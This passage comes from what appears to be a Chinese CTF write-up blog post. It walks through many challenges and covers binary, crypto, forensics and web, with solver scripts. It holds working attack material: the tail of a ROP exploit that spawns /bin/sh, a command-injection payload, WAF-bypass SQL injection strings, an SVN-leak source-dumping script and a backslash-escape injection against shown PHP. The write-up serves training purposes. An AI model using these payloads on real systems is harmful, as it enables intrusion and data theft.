p64(pop_rdi_ret)+p64(fake_fsp+<span class="number">0x50</span>+<span class="number">0x18</span>)</div><div class="line">rop += p64(pop_rdx_rsi_ret)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(pop_rax_rdx_rbx_ret)+p64(<span class="number">0x3b</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</div><div class="line">rop += p64(syscall)</div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line">rop += <span class="string">"/bin/sh\x00"</span></div><div class="line"></div><div class="line"></div><div class="line">sl(rop)</div><div class="line"><span class="comment"># payload = "%6$hn"</span></div><div class="line"></div><div class="line"></div><div class="line">p.interactive()</div><div class="line"><span class="comment"># flag&#123;9d3db853efce91066f22f1bc09aea6&#125;</span></div></pre></td></tr></table></figure><h3 id="XOR"><a href="#XOR" class="headerlink" title="XOR"></a>XOR</h3><p>看了加密脚本。。可以直接写出解密脚本，流程基本上没有变化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode</div><div class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</div><div class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</div><div class="line"></div><div class="line"><span class="keyword">with</span> open(<span class="string">'flag.enc'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</div><div class="line">s = f.read()</div><div class="line">p = b64decode(s)</div><div class="line"></div><div class="line"></div><div class="line">blocks = unpack(<span class="string">'I'</span> * (len(p) / <span class="number">4</span>), p)</div><div class="line">result = [block ^ block &gt;&gt; <span class="number">16</span> <span class="keyword">for</span> block <span class="keyword">in</span> blocks]</div><div class="line">ciphertext = (<span class="string">''</span>.join(pack(<span class="string">'I'</span>,block) <span class="keyword">for</span> block <span class="keyword">in</span> result))</div><div class="line"></div><div class="line"><span class="keyword">print</span> ciphertext[::<span class="number">-1</span>]</div></pre></td></tr></table></figure><h3 id="moudle"><a href="#moudle" class="headerlink" title="moudle"></a>moudle</h3><p>其实题目名字已经提示了很多了，但是。。我在赛场上竟然蠢的只看了其中一个公钥文件0 0，然后GG。常规思路，用rsatools跑了一下，发现没有任何信息，赛后得知其实RSA共模攻击，0 0蠢的想扇死自己。。。</p><h3 id="findme"><a href="#findme" class="headerlink" title="findme"></a>findme</h3><p>比较良心，没去掉后缀名，用winhex转换磁盘镜像获得磁盘回收站内的zip文件，然后需要解密ORZ，以为是伪加密，但是不存在的，010打开，发现zip文件末尾存在额外数据，尝试用gbk解码，发现提示。用工具很快就能爆破出密码。stegslove打开，在其额外数据段发现其内存在flag= = </p><h3 id="pyc"><a href="#pyc" class="headerlink" title="pyc"></a>pyc</h3><p>使用GitTools恢复出了四个历史文件夹，其中两个里面发现了存在数据，一个是pyc文件，还有一个压缩包，不知道干嘛的，010打开pyc文件，发现有密码，一开始没有在意，用常规思路，去逆向pyc，发现不存在的，后来试着用刚刚发现的密码去解压压缩文件，发现有现成的攻击可以跑。。。ORZ<br>跑出来就是flag</p><h3 id="pcap"><a href="#pcap" class="headerlink" title="pcap"></a>pcap</h3><p>用<code>NetworkMiner</code>提取数据，发现存在几个图片文件和一个密文，提示是aes，尝试用aes去破解，获得png数据，生成图片后，扫码获得flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">key = <span class="string">b'EaRncVfLgIPMaygA'</span></div><div class="line">iv = <span class="string">b'HDkMsMEzkkzyQLTH'</span></div><div class="line">cipher = AES.new(key, AES.MODE_ECB, iv)</div><div class="line">msg = iv + base64.b64decode(<span class="string">"kWZnRZMZv9JJLcD4v6o19iFKHOhc/S1Dv5y3r2YxhnRuWE8w/ji0jr0VFAGDbfzyQLcONBtB6pjetkHggUPv/rUmXoSfTnnWJ/cfv9deT56KoxwtXMGO4LJyXakTPE2tMcu0UexsnlhfhlqUE2vGnNnNUm996thkRlp3v36OfwgVGfT22UVjv+lpk0lKXgT2liQm/eBRilEaPw4o6P29YV7zN3AqI2y5Sa+I13o53cwO9JNOCXC28wuYSBrbOauu61VGj9MroQ3Si5swvx4p8vzyZZd5SkjIJ69AFi6pGPxnptofigIS5NRvVYLady+n0IWDj32whAPinOHcB8t3qJH1YtwNf9ly7gFQUgqCEXXDuRTcercMxe72siNNtg1LZTVQJLViD4G1ROdrh9Lic2BTe/9mAt/mKeRIaXJDHrTTu/d6xao4P995xjhSAhkD+cgbuOCgwhkpVH6cyRR+aFKFBv6UVZzob4s7ul9Xjzc9ETBaoE8CoAXLSZ5zEGs0jEbL0Hf5SdenlISyny97BFnqiGXRQCwBIacq+ytw/VK6DC2ddHAOndZ5K/zmnE0WuccCDTQ8gskaswFpbSG4q47HaN8t/VNug4NfZSGE/kbf+rW7QGlwMF66ksxhpthlkXJkICbpgnHNwsAjZnDhN1t9SDms4EIbozHaopiH79gy+h3N8lk/85OJfM0rac5CGcFlO9Tgf0ov6cGe8ABTIw1tFKZIcXWqETIbl60WCgBxmJFsBbl0ikDDyTsxSn8cNK8bVymqmL5TuTM2clBhd/rV44nA5vCGAnEKzfEHoV3YFc4gik8/nUutDmxJdjeqrd7M0Lm0QKpVPl8ATA5Tf2PKTJ9CaxIiLyazY74D2egqYZzddjq4aXXNPWgwYk5OKAZz+avRMJWu+ACx0wlih0ScOor4PMbpRqSc8oEjmeg="</span>)</div><div class="line">cipher.decrypt(msg)</div></pre></td></tr></table></figure><h3 id="wordpress"><a href="#wordpress" class="headerlink" title="wordpress"></a>wordpress</h3><p>按照提示做出来的，本来可以用find命令查最近修改文件的日期来获取信息，但是命令忘了，又不能够连接网络ORZ。。。提示是存在后门。grep一下eval(找到后门文件，接下来常规思路。(赛后得知可以用killshell来快速查找后门的，找后门的还有几个工具，有时间得拿出来比较实验以下~web弱渣了ORZ)</p><h3 id="Replace"><a href="#Replace" class="headerlink" title="Replace"></a>Replace</h3><p>解压缩包密码的过程就不说了吧，很无聊</p><p>直接upx解壳，<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">a = [<span class="number">0x63</span>,<span class="number">0x7C</span>,<span class="number">0x77</span>,<span class="number">0x7B</span>,<span class="number">0x0F2</span>,<span class="number">0x6B</span>,<span class="number">0x6F</span>,<span class="number">0x0C5</span>,<span class="number">0x30</span>,<span class="number">0x1</span>,<span class="number">0x67</span>,<span class="number">0x2B</span>,<span class="number">0x0FE</span>,<span class="number">0x0D7</span>,<span class="number">0x0AB</span>,<span class="number">0x76</span>,<span class="number">0x0CA</span>,<span class="number">0x82</span>,<span class="number">0x0C9</span>,<span class="number">0x7D</span>,<span class="number">0x0FA</span>,<span class="number">0x59</span>,<span class="number">0x47</span>,<span class="number">0x0F0</span>,<span class="number">0x0AD</span>,<span class="number">0x0D4</span>,<span class="number">0x0A2</span>,<span class="number">0x0AF</span>,<span class="number">0x9C</span>,<span class="number">0x0A4</span>,<span class="number">0x72</span>,<span class="number">0x0C0</span>,<span class="number">0x0B7</span>,<span class="number">0x0FD</span>,<span class="number">0x93</span>,<span class="number">0x26</span>,<span class="number">0x36</span>,<span class="number">0x3F</span>,<span class="number">0x0F7</span>,<span class="number">0x0CC</span>,<span class="number">0x34</span>,<span class="number">0x0A5</span>,<span class="number">0x0E5</span>,<span class="number">0x0F1</span>,<span class="number">0x71</span>,<span class="number">0x0D8</span>,<span class="number">0x31</span>,<span class="number">0x15</span>,<span class="number">0x4</span>,<span class="number">0x0C7</span>,<span class="number">0x23</span>,<span class="number">0x0C3</span>,<span class="number">0x18</span>,<span class="number">0x96</span>,<span class="number">0x5</span>,<span class="number">0x9A</span>,<span class="number">0x7</span>,<span class="number">0x12</span>,<span class="number">0x80</span>,<span class="number">0x0E2</span>,<span class="number">0x0EB</span>,<span class="number">0x27</span>,<span class="number">0x0B2</span>,<span class="number">0x75</span>,<span class="number">0x9</span>,<span class="number">0x83</span>,<span class="number">0x2C</span>,<span class="number">0x1A</span>,<span class="number">0x1B</span>,<span class="number">0x6E</span>,<span class="number">0x5A</span>,<span class="number">0x0A0</span>,<span class="number">0x52</span>,<span class="number">0x3B</span>,<span class="number">0x0D6</span>,<span class="number">0x0B3</span>,<span class="number">0x29</span>,<span class="number">0x0E3</span>,<span class="number">0x2F</span>,<span class="number">0x84</span>,<span class="number">0x53</span>,<span class="number">0x0D1</span>,<span class="number">0x0</span>,<span class="number">0x0ED</span>,<span class="number">0x20</span>,<span class="number">0x0FC</span>,<span class="number">0x0B1</span>,<span class="number">0x5B</span>,<span class="number">0x6A</span>,<span class="number">0x0CB</span>,<span class="number">0x0BE</span>,<span class="number">0x39</span>,<span class="number">0x4A</span>,<span class="number">0x4C</span>,<span class="number">0x58</span>,<span class="number">0x0CF</span>,<span class="number">0x0D0</span>,<span class="number">0x0EF</span>,<span class="number">0x0AA</span>,<span class="number">0x0FB</span>,<span class="number">0x43</span>,<span class="number">0x4D</span>,<span class="number">0x33</span>,<span class="number">0x85</span>,<span class="number">0x45</span>,<span class="number">0x0F9</span>,<span class="number">0x2</span>,<span class="number">0x7F</span>,<span class="number">0x50</span>,<span class="number">0x3C</span>,<span class="number">0x9F</span>,<span class="number">0x0A8</span>,<span class="number">0x51</span>,<span class="number">0x0A3</span>,<span class="number">0x40</span>,<span class="number">0x8F</span>,<span class="number">0x92</span>,<span class="number">0x9D</span>,<span class="number">0x38</span>,<span class="number">0x0F5</span>,<span class="number">0x0BC</span>,<span class="number">0x0B6</span>,<span class="number">0x0DA</span>,<span class="number">0x21</span>,<span class="number">0x10</span>,<span class="number">0x0FF</span>,<span class="number">0x0F3</span>,<span class="number">0x0D2</span>,<span class="number">0x0CD</span>,<span class="number">0x0C</span>,<span class="number">0x13</span>,<span class="number">0x0EC</span>,<span class="number">0x5F</span>,<span class="number">0x97</span>,<span class="number">0x44</span>,<span class="number">0x17</span>,<span class="number">0x0C4</span>,<span class="number">0x0A7</span>,<span class="number">0x7E</span>,<span class="number">0x3D</span>,<span class="number">0x64</span>,<span class="number">0x5D</span>,<span class="number">0x19</span>,<span class="number">0x73</span>,<span class="number">0x60</span>,<span class="number">0x81</span>,<span class="number">0x4F</span>,<span class="number">0x0DC</span>,<span class="number">0x22</span>,<span class="number">0x2A</span>,<span class="number">0x90</span>,<span class="number">0x88</span>,<span class="number">0x46</span>,<span class="number">0x0EE</span>,<span class="number">0x0B8</span>,<span class="number">0x14</span>,<span class="number">0x0DE</span>,<span class="number">0x5E</span>,<span class="number">0x0B</span>,<span class="number">0x0DB</span>,<span class="number">0x0E0</span>,<span class="number">0x32</span>,<span class="number">0x3A</span>,<span class="number">0x0A</span>,<span class="number">0x49</span>,<span class="number">0x6</span>,<span class="number">0x24</span>,<span class="number">0x5C</span>,<span class="number">0x0C2</span>,<span class="number">0x0D3</span>,<span class="number">0x0AC</span>,<span class="number">0x62</span>,<span class="number">0x91</span>,<span class="number">0x95</span>,<span class="number">0x0E4</span>,<span class="number">0x79</span>,<span class="number">0x0E7</span>,<span class="number">0x0C8</span>,<span class="number">0x37</span>,<span class="number">0x6D</span>,<span class="number">0x8D</span>,<span class="number">0x0D5</span>,<span class="number">0x4E</span>,<span class="number">0x0A9</span>,<span class="number">0x6C</span>,<span class="number">0x56</span>,<span class="number">0x0F4</span>,<span class="number">0x0EA</span>,<span class="number">0x65</span>,<span class="number">0x7A</span>,<span class="number">0x0AE</span>,<span class="number">0x8</span>,<span class="number">0x0BA</span>,<span class="number">0x78</span>,<span class="number">0x25</span>,<span class="number">0x2E</span>,<span class="number">0x1C</span>,<span class="number">0x0A6</span>,<span class="number">0x0B4</span>,<span class="number">0x0C6</span>,<span class="number">0x0E8</span>,<span class="number">0x0DD</span>,<span class="number">0x74</span>,<span class="number">0x1F</span>,<span class="number">0x4B</span>,<span class="number">0x0BD</span>,<span class="number">0x8B</span>,<span class="number">0x8A</span>,<span class="number">0x70</span>,<span class="number">0x3E</span>,<span class="number">0x0B5</span>,<span class="number">0x66</span>,<span class="number">0x48</span>,<span class="number">0x3</span>,<span class="number">0x0F6</span>,<span class="number">0x0E</span>,<span class="number">0x61</span>,<span class="number">0x35</span>,<span class="number">0x57</span>,<span class="number">0x0B9</span>,<span class="number">0x86</span>,<span class="number">0x0C1</span>,<span class="number">0x1D</span>,<span class="number">0x9E</span>,<span class="number">0x0E1</span>,<span class="number">0x0F8</span>,<span class="number">0x98</span>,<span class="number">0x11</span>,<span class="number">0x69</span>,<span class="number">0x0D9</span>,<span class="number">0x8E</span>,<span class="number">0x94</span>,<span class="number">0x9B</span>,<span class="number">0x1E</span>,<span class="number">0x87</span>,<span class="number">0x0E9</span>,<span class="number">0x0CE</span>,<span class="number">0x55</span>,<span class="number">0x28</span>,<span class="number">0x0DF</span>,<span class="number">0x8C</span>,<span class="number">0x0A1</span>,<span class="number">0x89</span>,<span class="number">0x0D</span>,<span class="number">0x0BF</span>,<span class="number">0x0E6</span>,<span class="number">0x42</span>,<span class="number">0x68</span>,<span class="number">0x41</span>,<span class="number">0x99</span>,<span class="number">0x2D</span>,<span class="number">0x0F</span>,<span class="number">0x0B0</span>,<span class="number">0x54</span>,<span class="number">0x0BB</span>,<span class="number">0x16</span>]</div><div class="line">b = <span class="string">"bb3ccfb0213965aed24b9264ae4bbb92543954bb0739bbbbcf64f554cff5f365f565f386"</span>.decode(<span class="string">"hex"</span>)</div><div class="line"></div><div class="line">flag = <span class="string">""</span></div><div class="line"><span class="keyword">for</span> x <span class="keyword">in</span> b:</div><div class="line">    d = ord(x) ^ <span class="number">0x88</span></div><div class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> range(<span class="number">0x0</span>,<span class="number">0xff</span>):</div><div class="line">        <span class="comment"># print (y &amp;0xf)+(y &gt;&gt; 4)*2</span></div><div class="line">        <span class="keyword">if</span> a[(y &gt;&gt; <span class="number">4</span>)+<span class="number">8</span>*((y &amp;<span class="number">0xf</span>)*<span class="number">2</span>)] == d:</div><div class="line">            flag += chr(y)</div><div class="line">            <span class="keyword">break</span></div><div class="line"><span class="keyword">print</span> flag</div><div class="line"></div><div class="line"><span class="comment"># flag&#123;e52d34823f49e9f7effa819a105150&#125;</span></div></pre></td></tr></table></figure></p><h3 id="送分题"><a href="#送分题" class="headerlink" title="送分题"></a>送分题</h3><p>web弱渣就算碰到送分题也不会啊，通过提示和提供的密码本，原来考察点是在于弱口令ORZ （好吧，服了，一直拿sql在注，返回速度还特别慢），用burp加载top 10 password（原来还有这种东西），爆破登录界面得到flag。</p><h3 id="code"><a href="#code" class="headerlink" title="code"></a>code</h3><p>秒做的题目, payload <code>127.0.0.1;cat flag</code> 命令执行绕过有很多姿势，但遗憾的是这边没有过滤。 </p><h3 id="waf"><a href="#waf" class="headerlink" title="waf"></a>waf</h3><p>waf这题题目其实一开始也不会的，也是通过提示来过的，黑盒测试发现waf拦截许多东西，最为关键的就是 union select，所以想办法绕过，经过N次测试，发现<code>/*!50000select*/</code> 不会被waf拦截，于是构造<code>%27/*!50000union*/%0a/*!50000select*/%0aflag%0a/*!50000from*/flag%23</code> 得到flag</p><h3 id="blog"><a href="#blog" class="headerlink" title="blog"></a>blog</h3><p>好像是叫这个名字？忘了，赛后听说是admin，密码是123456，然后进去一系列骚操作获取flag，又是考弱口令啊啊啊啊啊啊</p><h3 id="markdown"><a href="#markdown" class="headerlink" title="markdown"></a>markdown</h3><p>也是赛后得知的，考察通过markdown的ssrf来获取信息，语法是<code>![](flag.php)</code>，flag的文件名需要通过robots.txt文件来获取，构造即可从源码中获得到flag信息。</p><h3 id="box"><a href="#box" class="headerlink" title="box"></a>box</h3><p>也是赛后得知的，听说是全国大学生信安赛的<code>wanna to see your hat</code> ,（蜜汁微笑，技术支持真懒）。不过作为biner，当时比赛的时候，没去碰这题题目，没做出来，认了。。。。赛后复现如下。</p><p>拿weakfilescan扫描以下敏感文件，发现存在svn泄漏。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">--------------------------------------------------</div><div class="line">* scan http://123.59.52.228:1515 start</div><div class="line">--------------------------------------------------</div><div class="line">[200] http://123.59.52.228:1515 =&gt; http://123.59.52.228:1515/route.php?act=index</div><div class="line">[200] http://123.59.52.228:1515/.svn/entries =&gt; http://123.59.52.228:1515/.svn/entries</div><div class="line">--------------------------------------------------</div><div class="line">* scan complete...</div><div class="line">--------------------------------------------------</div><div class="line">&#123;</div><div class="line">  &quot;dirs&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: [</div><div class="line">      &quot;http://123.59.52.228:1515/&quot;</div><div class="line">    ]</div><div class="line">  &#125;, </div><div class="line">  &quot;files&quot;: &#123;</div><div class="line">    &quot;http://123.59.52.228:1515&quot;: &#123;</div><div class="line">      &quot;/.svn/&quot;: [</div><div class="line">        &quot;http://123.59.52.228:1515/.svn/entries&quot;</div><div class="line">      ]</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>使用svn.py将源码dump下来。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/env python      </span></div><div class="line"><span class="comment">#coding:utf-8</span></div><div class="line">__author__ = <span class="string">'Rivir'</span></div><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"> </div><div class="line"><span class="keyword">print</span> <span class="string">'''</span></div><div class="line"> ----</div><div class="line">    _____               ______            __    </div><div class="line">  / ___/   ______     /_  __/___  ____  / /____</div><div class="line">  \__ \ | / / __ \     / / / __ \/ __ \/ / ___/</div><div class="line"> ___/ / |/ / / / /    / / / /_/ / /_/ / (__  ) </div><div class="line">/____/|___/_/ /_/    /_/  \____/\____/_/____/  </div><div class="line">                author: Rivir</div><div class="line"> ----</div><div class="line">\                             .       .</div><div class="line"> \                           / `.   .' " </div><div class="line">  \                  .---.  &lt;    &gt; &lt;    &gt;  .---.</div><div class="line">   \                 |    \  \ - ~ ~ - /  /    |</div><div class="line">         _____          ..-~             ~-..-~</div><div class="line">        |     |   \~~~\.'                    `./~~~/</div><div class="line">       ---------   \__/                        \__/</div><div class="line">      .'  O    \     /               /       \  " </div><div class="line">     (_____,    `._.'               |         &#125;  \/~~~/</div><div class="line">      `----.          /       &#125;     |        /    \__/</div><div class="line">            `-.      |       /      |       /      `. ,~~|</div><div class="line">                ~-.__|      /_ - ~ ^|      /- _      `..-'   </div><div class="line">                     |     /        |     /     ~-.     `-. _  _  _</div><div class="line">                     |_____|        |_____|         ~ - . _ _ _ _ _&gt;</div><div class="line"> </div><div class="line">'''</div><div class="line"> </div><div class="line">headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0'</span>&#125;</div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getfilename</span><span class="params">(url)</span>:</span></div><div class="line">    <span class="keyword">with</span> open(<span class="string">'wc.db'</span>,<span class="string">'wb'</span>) <span class="keyword">as</span> f:</div><div class="line">        content = requests.get(url=url+<span class="string">'/.svn/wc.db'</span>,headers=headers).content</div><div class="line">        f.write(content)</div><div class="line"> </div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> file:</div><div class="line">        info = os.popen(<span class="string">"""sqlite3 wc.db 'select local_relpath, ".svn/pristine/" || substr(checksum,7,2) || "/" || substr(checksum,7) || ".svn-base" as alpha from NODES;'"""</span>).read()</div><div class="line">        <span class="comment">#print info</span></div><div class="line">        file.write(info)</div><div class="line"> </div><div class="line">    os.remove(<span class="string">'wc.db'</span>)</div><div class="line"> </div><div class="line"> </div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">restore_svn</span><span class="params">(url)</span>:</span></div><div class="line">    getfilename(url)</div><div class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn'</span>):</div><div class="line">        os.mkdir(<span class="string">'svn'</span>)</div><div class="line">    <span class="keyword">with</span> open(<span class="string">'svn.txt'</span>) <span class="keyword">as</span> f:</div><div class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> f:</div><div class="line">            tmp = file.strip().split(<span class="string">'|'</span>)</div><div class="line">            <span class="comment">#print tmp</span></div><div class="line">            <span class="keyword">if</span> len(tmp) == <span class="number">1</span>:</div><div class="line">                <span class="keyword">continue</span></div><div class="line">            name = tmp[<span class="number">0</span>]</div><div class="line">            path = tmp[<span class="number">1</span>]</div><div class="line">            <span class="keyword">if</span> <span class="string">'/'</span> <span class="keyword">in</span> name:</div><div class="line">                book = os.path.dirname(name)</div><div class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">'./svn/'</span>+book):</div><div class="line">                    os.makedirs(<span class="string">'./svn/'</span>+book)</div><div class="line"> </div><div class="line"> </div><div class="line">            <span class="keyword">print</span> <span class="string">'download:'</span>,<span class="string">'./svn/'</span>+name</div><div class="line">            <span class="keyword">try</span>:</div><div class="line">                <span class="keyword">with</span> open(<span class="string">'./svn/'</span>+name,<span class="string">'w'</span>) <span class="keyword">as</span> f:</div><div class="line">                    req = requests.get(url+path,headers=headers)</div><div class="line">                    f.write(req.content)</div><div class="line">            <span class="keyword">except</span> Exception,e:</div><div class="line">                <span class="comment">#print e </span></div><div class="line">                <span class="keyword">pass</span></div><div class="line"> </div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</div><div class="line">    restore_svn(sys.argv[<span class="number">-1</span>])</div></pre></td></tr></table></figure><p>发现flag.php文件，然而并没有什么软用。发现<code>index.php</code>中，如果<code>$_SESSION[&quot;hat&quot;]</code> == <code>&quot;black&quot;</code> 会输出flag，所以我们希望找到一个地方，这个地方是给<code>$_SESSION[&quot;hat&quot;]</code>赋予<code>&quot;black&quot;</code>字符串的，我们在login.php中找到了。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">   $sql = <span class="string">"select count(*) from t_info where username = '$name' or nickname = '$name'"</span>;</div><div class="line">   <span class="keyword">echo</span> $sql;</div><div class="line">   $result = mysql_query($sql);</div><div class="line">   $row = mysql_fetch_array($result);</div><div class="line">   <span class="keyword">if</span> ($row[<span class="number">0</span>])&#123;</div><div class="line">     $_SESSION[<span class="string">'hat'</span>] = <span class="string">'black'</span>;</div><div class="line">     <span class="keyword">echo</span> <span class="string">'good job'</span>;</div><div class="line">   &#125;<span class="keyword">else</span>&#123;</div><div class="line">$_SESSION[<span class="string">'hat'</span>] = <span class="string">'green'</span>;</div><div class="line">   &#125;</div></pre></td></tr></table></figure><p>这边有个坑，reg那个页面中所用的表和login页面中登录的表不一样。。所以无论怎么注册都没用，需要选手绕过waf来注入。。。</p><p>waf规则</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$name = str_replace(<span class="string">"'"</span>, <span class="string">""</span>, trim(waf($_POST[<span class="string">"name"</span>])));</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span><span class="params">($value)</span></span>&#123;</div><div class="line">    $Filt = <span class="string">"\bUNION.+SELECT\b|SELECT.+?FROM"</span>;</div><div class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.$Filt.<span class="string">"/is"</span>,$value)==<span class="number">1</span>)&#123;</div><div class="line">        <span class="keyword">die</span>(<span class="string">"found a hacker"</span>);</div><div class="line">    &#125;</div><div class="line">    $value = str_replace(<span class="string">" "</span>,<span class="string">""</span>,$value);  </div><div class="line">    <span class="keyword">return</span> $value;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>$_POST首先会被全局转义，故而会多出个反斜杠，这边waf替换掉了单引号，但是没有替换掉反斜杠，导致反斜杠的特殊利用。</p><p><code>select count(*) from t_info where username = &#39;||1#\&#39; or nickname = &#39;||1#\&#39;</code></p><p>转到index页面获取flag</p><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>???这waf太强啦，真不会啊~</p><p>跪求大佬的wp</p><h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>此次比赛网络环境确实不是很好，所以对于做离线题目的选手要有利的多，离线的环境。做web题的时候，用weakfilescan来发现敏感文件，发现这玩意不支持302，真坑啊。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;还好这次比赛网络环境比较差，主办方被迫放了许多离线题，让我这只bin dog有机可乘（手动滑稽），但这次比赛也确实发现自身的web能力有限，对于一些简单的web题竟然出现无从下手的情况。。也借这次比赛总结下离线环境下一些特殊操作吧。&lt;/p&gt;
&lt;h3 id=&quot;正文&quot;&gt;&lt;a href=&quot;#正文&quot; class=&quot;headerlink&quot; title=&quot;正文&quot;&gt;&lt;/a&gt;正文&lt;/h3&gt;&lt;p&gt;对于一些密码类的题目，手头有合适的工具最好了，但很多情况下，工具并不适用，比如这次比赛中，出现的aes解密，不清楚加密模式，需要输入iv和key，而手头的工具只可以输入key，且加密模式确定，没办法，只能去找库，不过比较幸运的是，之前安装过一个crypt的python库，看里面的源码，竟然有aes加密的说明，简单的倒推一下就能够推出解密脚本。&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; AES&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;key = &lt;span class=&quot;string&quot;&gt;b&#39;EaRncVfLgIPMaygA&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;iv = &lt;span class=&quot;string&quot;&gt;b&#39;HDkMsMEzkkzyQLTH&#39;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;cipher = AES.new(key, AES.MODE_CBC, iv)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;msg = iv + base64.b64decode(&lt;span 